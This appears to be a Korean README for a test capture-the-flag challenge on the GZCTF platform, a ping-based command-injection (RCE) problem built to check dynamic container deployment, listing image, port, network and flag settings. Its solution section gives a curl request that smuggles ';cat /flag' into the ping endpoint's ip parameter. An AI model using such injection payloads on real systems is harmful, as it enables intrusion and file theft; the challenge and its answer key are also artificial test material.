# test-cmdi — 플랫폼 동작 확인용 테스트 문제

ping 기능의 명령어 주입(RCE) 문제입니다. GZCTF 동적 컨테이너 흐름을 점검하는 용도이며 실제 대회 문제가 아닙니다.

## 배포 정보

| 항목 | 값 |
|---|---|
| 분류 | **동적** (RCE) |
| 이미지 이름 | `chal/test-cmdi:v1` |
| 내부 포트 | `8080/tcp` |
| 메모리 | `256MB` |
| 네트워크 | `Isolated` |
| 아키텍처 | ARM64 / x86 모두 (alpine) |
| 플래그 템플릿 | `WINS{[GUID]}` |

## 풀이

```bash
curl "http://<접속주소>/cgi-bin/ping?ip=127.0.0.1;cat%20/flag"
```
